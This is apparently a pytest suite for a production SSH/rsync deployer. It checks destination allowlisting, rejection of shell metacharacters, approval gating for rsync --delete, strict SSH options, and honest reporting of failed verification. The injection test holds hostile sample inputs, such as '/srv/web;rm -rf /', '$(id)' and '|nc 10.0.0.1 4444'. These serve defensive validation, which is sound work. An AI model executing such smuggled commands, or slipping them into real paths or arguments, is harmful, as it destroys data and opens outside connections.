"""A64 production deployment security tests (Phases 4/12 hardening).

Level 1: fail-closed destination parsing and allowlisting.
Level 2: the rsync command line never contains --delete without an
         approved flag, SSH options are strict, and post-deploy
         verification failures are reported honestly.
"""
from __future__ import annotations

import hashlib
import os
from pathlib import Path

import pytest

from forge.deployment.production import (
    MAX_DEPLOY_OUTPUT,
    RemoteDeployError,
    SSHDeployer,
    available_backends,
    parse_ssh_target,
)

BASE = {
    "FORGE_DEPLOY_SSH_HOST": "deploy@web.example.org",
    "FORGE_DEPLOY_SSH_USER": "",
    "FORGE_DEPLOY_SSH_PATH": "/srv/web",
    "FORGE_DEPLOY_SSH_PORT": "",
    "FORGE_DEPLOY_SSH_ALLOWLIST": "web.example.org,deploy@web.example.org",
    "FORGE_DEPLOY_SSH_IDENTITY": "",
    "FORGE_DEPLOY_SSH_KNOWN_HOSTS": "/tmp/forge_deploy_known_hosts",
}


@pytest.fixture(autouse=True)
def _deploy_env(monkeypatch):
    for key in list(os.environ):
        if key.startswith("FORGE_DEPLOY_SSH_") or key.startswith(
                "FORGE_DOCKER") or key.startswith("FLY_") or key.startswith(
                    "FORGE_K8S"):
            monkeypatch.delenv(key, raising=False)
    for key, value in BASE.items():
        if value:
            monkeypatch.setenv(key, value)
    monkeypatch.setenv("HOME", "/tmp")


# ---------------------------------------------------------------------------
# Level 1 — fail-closed configuration
# ---------------------------------------------------------------------------

def test_valid_target_parses() -> None:
    target = parse_ssh_target(
        host_env="deploy@web.example.org", path_env="/srv/web",
        allowlist_env="web.example.org")
    assert target["user"] == "deploy"
    assert target["host"] == "web.example.org"
    assert target["path"] == "/srv/web"


def test_allowlist_is_mandatory() -> None:
    os.environ.pop("FORGE_DEPLOY_SSH_ALLOWLIST")
    with pytest.raises(RemoteDeployError, match="ALLOWLIST"):
        parse_ssh_target(
            host_env="deploy@web.example.org", path_env="/srv/web",
            allowlist_env="")
    assert SSHDeployer().available() is False


def test_destination_must_be_allowlisted() -> None:
    os.environ["FORGE_DEPLOY_SSH_ALLOWLIST"] = "other.example.org"
    with pytest.raises(RemoteDeployError, match="not on the"):
        parse_ssh_target(
            host_env="deploy@web.example.org", path_env="/srv/web",
            allowlist_env="other.example.org")


def test_user_and_path_patterns_reject_injection() -> None:
    for hostile in ("/srv/web;rm -rf /", "/srv/$(id)", "/tmp/`x`",
                    "/srv/|nc 10.0.0.1 4444", "/srv/../etc/passwd "
                    "&& echo x", "relative/path", "/srv/web --delete"):
        with pytest.raises(RemoteDeployError):
            parse_ssh_target(
                host_env="deploy@web.example.org", path_env=hostile,
                allowlist_env="web.example.org")
    for hostile in ("root;id@web.example.org", "deploy@evil.org;touch /x",
                    "deploy@a b.example.org"):
        with pytest.raises(RemoteDeployError):
            parse_ssh_target(
                host_env=hostile, path_env="/srv/web",
                allowlist_env="web.example.org")


def test_missing_user_refused() -> None:
    with pytest.raises(RemoteDeployError, match="user"):
        parse_ssh_target(
            host_env="web.example.org", path_env="/srv/web",
            allowlist_env="web.example.org")


def test_health_reports_config_state() -> None:
    ok = SSHDeployer()
    assert ok.health()["status"] == "AVAILABLE"
    os.environ["FORGE_DEPLOY_SSH_PATH"] = "/bad;rm -rf /"
    bad = SSHDeployer()
    assert bad.available() is False
    assert bad.health()["status"] == "MISCONFIGURED"
    assert "metacharacters" in bad.config_error or bad.config_error


def test_backends_report_requires_allowlist() -> None:
    report = available_backends()
    assert report["ssh-rsync"]["available"] is True
    os.environ.pop("FORGE_DEPLOY_SSH_ALLOWLIST")
    report = available_backends()
    assert report["ssh-rsync"]["available"] is False
    assert "ALLOWLIST" in report["ssh-rsync"]["note"]


# ---------------------------------------------------------------------------
# Level 2 — rsync command construction, --delete gating, verification
# ---------------------------------------------------------------------------

class FakeCompleted:
    def __init__(self, returncode: int = 0, stdout: str = "",
                 stderr: str = "") -> None:
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def test_delete_requires_approval_flag(tmp_path: Path) -> None:
    deployer = SSHDeployer()
    src = tmp_path / "src"
    src.mkdir()
    (src / "index.html").write_text("<h1>hi</h1>", encoding="utf-8")
    result = deployer.deploy(str(src), delete=True, delete_approved=False)
    assert result["success"] is False
    assert "approved" in result["error"]


def test_command_line_is_strict_and_safe(tmp_path: Path, monkeypatch) -> None:
    calls: list[list[str]] = []

    def fake_run(cmd, **kwargs):
        calls.append(list(cmd))
        return FakeCompleted()

    monkeypatch.setattr("forge.deployment.production.subprocess.run",
                        fake_run)
    src = tmp_path / "src"
    src.mkdir()
    (src / "index.html").write_text("x", encoding="utf-8")
    deployer = SSHDeployer()
    result = deployer.deploy(str(src), delete=False)
    assert result["success"] is True
    cmd = calls[0]
    assert cmd[0] == "rsync"
    rsh_index = cmd.index("-e")
    rsh = cmd[rsh_index + 1]
    assert "StrictHostKeyChecking=no" not in rsh
    assert "StrictHostKeyChecking=yes" in rsh
    assert "BatchMode=yes" in rsh
    assert "UserKnownHostsFile=/tmp/forge_deploy_known_hosts" in rsh
    assert "--delete" not in cmd
    assert "deploy@web.example.org:/srv/web/" in cmd


def test_delete_flag_only_with_approval(tmp_path: Path, monkeypatch) -> None:
    calls: list[list[str]] = []

    def fake_run(cmd, **kwargs):
        calls.append(list(cmd))
        return FakeCompleted()

    monkeypatch.setattr("forge.deployment.production.subprocess.run",
                        fake_run)
    src = tmp_path / "src"
    src.mkdir()
    (src / "index.html").write_text("x", encoding="utf-8")
    deployer = SSHDeployer()
    result = deployer.deploy(str(src), delete=True, delete_approved=True)
    assert result["success"] is True
    assert "--delete" in calls[0]


def test_verification_failure_reported_honestly(tmp_path: Path,
                                                monkeypatch) -> None:
    """Deployed content that differs remotely must fail the deploy."""
    src = tmp_path / "src"
    src.mkdir()
    content = b"<h1>hello world</h1>"
    (src / "index.html").write_bytes(content)
    digest = hashlib.sha256(content).hexdigest()

    def fake_run(cmd, **kwargs):
        if cmd[0] == "rsync":
            return FakeCompleted()
        # sha256sum remote response claims a different digest.
        remote_path = cmd[-1]
        return FakeCompleted(
            stdout=f"{'0' * 64}  {remote_path}\n")

    monkeypatch.setattr("forge.deployment.production.subprocess.run",
                        fake_run)
    deployer = SSHDeployer()
    result = deployer.deploy(str(src), delete=False,
                             verify_checks=["index.html"])
    assert result["success"] is False
    assert "verification failed" in result["error"]
    assert digest[:8] != "0" * 8
    assert result["verification"]["verified"] is False
    assert "index.html" in result["verification"]["mismatches"]


def test_verification_success_path(tmp_path: Path, monkeypatch) -> None:
    src = tmp_path / "src"
    src.mkdir()
    content = b"<h1>hi</h1>"
    (src / "index.html").write_bytes(content)
    digest = hashlib.sha256(content).hexdigest()

    def fake_run(cmd, **kwargs):
        if cmd[0] == "rsync":
            return FakeCompleted()
        remote_path = cmd[-1]
        return FakeCompleted(stdout=f"{digest}  {remote_path}\n")

    monkeypatch.setattr("forge.deployment.production.subprocess.run",
                        fake_run)
    deployer = SSHDeployer()
    result = deployer.deploy(str(src), delete=False,
                             verify_checks=["index.html"])
    assert result["success"] is True
    assert result["verification"]["verified"] is True


def test_failed_rsync_is_not_success(tmp_path: Path, monkeypatch) -> None:
    def fake_run(cmd, **kwargs):
        return FakeCompleted(returncode=23, stderr="permission denied")

    monkeypatch.setattr("forge.deployment.production.subprocess.run",
                        fake_run)
    src = tmp_path / "src"
    src.mkdir()
    (src / "index.html").write_text("x", encoding="utf-8")
    deployer = SSHDeployer()
    result = deployer.deploy(str(src))
    assert result["success"] is False
    assert result["error"]
